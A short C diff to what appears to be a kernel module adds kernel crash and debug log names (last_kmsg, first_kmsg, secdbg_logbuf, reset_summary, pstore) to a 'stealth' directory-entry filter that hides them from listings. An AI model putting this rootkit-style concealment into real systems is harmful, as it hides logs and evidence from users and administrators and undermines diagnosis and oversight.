@@ -63,6 +63,14 @@ static inline bool ghost_is_stealth_dirent(const char *name, int namlen)
 		return true;
 	if (namlen == 14 && !strncmp(name, "ghost_reset.sh", 14))
 		return true;
+	if (namlen == 9 && !strncmp(name, "last_kmsg", 9))
+		return true;
+	if (namlen == 10 && !strncmp(name, "first_kmsg", 10))
+		return true;
+	if (namlen == 13 && (!strncmp(name, "secdbg_logbuf", 13) || !strncmp(name, "reset_summary", 13)))
+		return true;
+	if (namlen == 6 && !strncmp(name, "pstore", 6))
+		return true;
 
 	return false;
 }
